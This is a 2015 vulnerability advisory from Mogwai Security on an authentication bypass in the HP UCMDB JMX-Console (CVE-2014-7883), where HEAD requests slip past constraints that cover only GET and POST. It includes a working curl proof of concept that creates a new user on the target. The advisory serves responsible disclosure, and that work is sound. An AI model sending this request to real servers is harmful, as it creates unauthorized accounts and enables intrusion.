@@ -1,0 +1,122 @@
+Mogwai Security Advisory MSA-2015-02
+----------------------------------------------------------------------
+Title: Hewlett-Packard UCMDB - JMX-Console Authentication Bypass
+CVE-ID: CVE-2014-7883
+Product: Hewlett-Packard Universal CMDB (UCMDB)    
+Affected versions: UCMDB 10.10 (Other versions might also be affected) 
+Impact: high
+Remote: yes
+Product link: http://www8.hp.com/us/en/software-solutions/configuration-management-system-database/index.html
+Reported: 14/11/2014 
+by: Hans-Martin Muench (Mogwai, IT-Sicherheitsberatung Muench) 
+
+
+Vendor's Description of the Software:
+----------------------------------------------------------------------
+The HP Universal CMDB (UCMDB) automatically collects and manages accurate and
+current business service definitions, associated infrastructure relationships and
+detailed information on the assets, and is a central component in many of the key processes in your
+IT organization, such as change management, asset management, service management, and business
+service management. The UCMDB ensures that these processes can rely on comprehensive and
+true data for all business services. Together with HP UCMDB Configuration Manager
+(UCMDB-CM) you can standardize your IT environments, and make sure they comply with clear
+policies, and defined authorization process.
+Many IT organizations turn to a CMDB and configuration management processes to create a
+shared single version of truth to support business service management, IT service management,
+change management, and asset management initiatives. These initiatives help align IT efforts
+with business requirements and run IT operations more efficiently and effectively.
+The initiatives success depends on the CMDB providing a complete view into the
+configuration items (CIs) and assets as well as how various IT elements relate together to deliver
+the business service.
+-----------------------------------------------------------------------
+
+Business recommendation:
+-----------------------------------------------------------------------
+Apply configuration changes from HP 
+https://softwaresupport.hp.com/group/softwaresupport/search-result/-/facetsearch/document/KM01351169
+
+
+-- CVSS2 Ratings ------------------------------------------------------
+
+CVSS Base Score: 6.4
+Impact Subscore: 4.9
+Exploitability Subscore: 10
+CVSS v2 Vector (AV:N/AC:L/Au:N/C:P/I:P/A:N)
+-----------------------------------------------------------------------
+
+
+Vulnerability description:
+----------------------------------------------------------------------
+UCMB administrators heavily rely on a JMX-Console, which is installed by
+default.
+The JMX-Console web application in UCMDB performs access control only for 
+the GET and POST methods, which allows remote attackers to send requests 
+to this application's GET handler by using a different method (for example
+HEAD).
+
+The web.xml file of the JMX Console contains following security constrains:
+
+<security-constraint>
+<web-resource-collection>
+<web-resource-name>Protected Pages</web-resource-name>
+<url-pattern>/*</url-pattern>
+<http-method>GET</http-method>
+<http-method>POST</http-method>
+</web-resource-collection>
+<auth-constraint>
+<role-name>sysadmin</role-name>
+</auth-constraint>
+</security-constraint>
+
+<security-constraint>
+<web-resource-collection>
+<web-resource-name>Callhome Servlet</web-resource-name>
+<url-pattern>/callhome</url-pattern>
+<http-method>GET</http-method>
+<http-method>POST</http-method>
+</web-resource-collection>
+</security-constraint>
+
+This vulnerability is identical with CVE-2010-0738 (JBoss JMX-Console 
+Authentication bypass). This can be used to create a new account which 
+can then be used to access the JMX console.
+
+
+Proof of concept:
+----------------------------------------------------------------------
+
+The following Curl command will send a HEAD request to create a new user
+"pocuser" in the UCMDB Backend:
+
+curl -I
+"http://foobar:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=UCMDB%3Aservice%3DAuthorization+Services&methodName=createUser&arg0=&arg1=zdi-poc&arg2=pocuser&arg3=zdi-poc&arg4=pocuser"
+
+Disclosure timeline:
+----------------------------------------------------------------------
+14/11/2014: Reporting issue to HP
+18/11/2014: Re-Reporting, as no acknowledge received
+18/11/2014: Acknowledge from HP
+02/01/2015: Requesting status update from HP
+29/01/2015: Requesting status update from HP
+31/01/2015: Response from HP, they plan to release the advisory next week
+02/05/2015: HP releases security bulletin
+03/05/2015: Mogwai security bulletin release
+
+
+Advisory URL:
+----------------------------------------------------------------------
+https://www.mogwaisecurity.de/#lab
+
+
+References:
+----------------------------------------------------------------------
+Official HP security bulletin
+https://h20564.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c04553906
+
+
+----------------------------------------------------------------------
+Mogwai, IT-Sicherheitsberatung Muench
+Steinhoevelstrasse 2/2
+89075 Ulm (Germany)
+
+info@mogwaisecurity.de 
